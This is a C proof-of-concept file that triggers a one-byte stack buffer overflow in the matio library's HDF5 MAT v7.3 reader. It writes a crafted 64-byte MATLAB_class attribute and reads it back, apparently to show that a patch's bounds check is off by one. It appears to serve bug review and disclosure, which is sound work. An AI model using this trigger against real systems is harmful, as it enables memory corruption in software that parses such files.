/*
 * PoC for a stack-buffer-overflow in Mat_H5ReadVarInfo (src/mat73.c).
 *
 * The patched reader copies the MATLAB_class attribute into a fixed 64-byte
 * local buffer, guarded by `class_len > sizeof(class_str)`. That bound is
 * off by one: a fixed-length class string whose storage size is exactly 64
 * bytes passes the check, but the attribute is then read with an HDF5 memory
 * type of size class_len + 1 (= 65) and NUL-terminated at index class_len
 * (= 64), writing one byte past the 64-byte buffer.
 *
 * This PoC drives the project's public API only:
 *   - Mat_CreateVer / Mat_VarWrite build an ordinary v7.3 file with one double.
 *   - the MATLAB_class attribute is rewritten to a 64-byte fixed string whose
 *     payload is the normal class name "double" (NUL-padded), so the file
 *     still describes a valid double variable.
 *   - Mat_Open + Mat_VarReadNext read it back, triggering the overflow.
 *
 * On the parent tree the class name is read into a calloc(class_len + 1)
 * heap buffer that is exactly large enough, so nothing fires there.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <hdf5.h>

#include "matio.h"

int
main(void)
{
    const char *path = "/tmp/poc_matclass.mat";
    const char *varname = "x";

    /* 1. Create a valid MAT v7.3 file holding one real double variable. */
    {
        mat_t *mat = Mat_CreateVer(path, NULL, MAT_FT_MAT73);
        double value = 3.14;
        size_t dims[2] = {1, 1};
        matvar_t *v;
        if ( NULL == mat ) {
            fprintf(stderr, "Mat_CreateVer failed\n");
            return 2;
        }
        v = Mat_VarCreate(varname, MAT_C_DOUBLE, MAT_T_DOUBLE, 2, dims, &value, 0);
        if ( NULL == v ) {
            Mat_Close(mat);
            return 2;
        }
        Mat_VarWrite(mat, v, MAT_COMPRESSION_NONE);
        Mat_VarFree(v);
        Mat_Close(mat);
    }

    /* 2. Rewrite MATLAB_class as a scalar, fixed-length string of size 64. */
    {
        hid_t fid, dset, t, sp, a;
        char buf[64];

        fid = H5Fopen(path, H5F_ACC_RDWR, H5P_DEFAULT);
        if ( fid < 0 ) {
            fprintf(stderr, "H5Fopen failed\n");
            return 2;
        }
        dset = H5Dopen2(fid, varname, H5P_DEFAULT);
        if ( dset < 0 ) {
            H5Fclose(fid);
            return 2;
        }
        H5Adelete(dset, "MATLAB_class");

        t = H5Tcopy(H5T_C_S1);
        H5Tset_size(t, 64);
        H5Tset_strpad(t, H5T_STR_NULLPAD);
        sp = H5Screate(H5S_SCALAR);
        a = H5Acreate2(dset, "MATLAB_class", t, sp, H5P_DEFAULT, H5P_DEFAULT);

        memset(buf, 0, sizeof(buf));
        memcpy(buf, "double", 6);
        H5Awrite(a, t, buf);

        H5Aclose(a);
        H5Sclose(sp);
        H5Tclose(t);
        H5Dclose(dset);
        H5Fclose(fid);
    }

    /* 3. Read it back through the public API; fires under ASan on the patch. */
    {
        mat_t *mat = Mat_Open(path, MAT_ACC_RDONLY);
        matvar_t *v;
        if ( NULL == mat ) {
            fprintf(stderr, "Mat_Open failed\n");
            return 2;
        }
        while ( (v = Mat_VarReadNext(mat)) != NULL ) {
            Mat_VarFree(v);
        }
        Mat_Close(mat);
    }

    return 0;
}
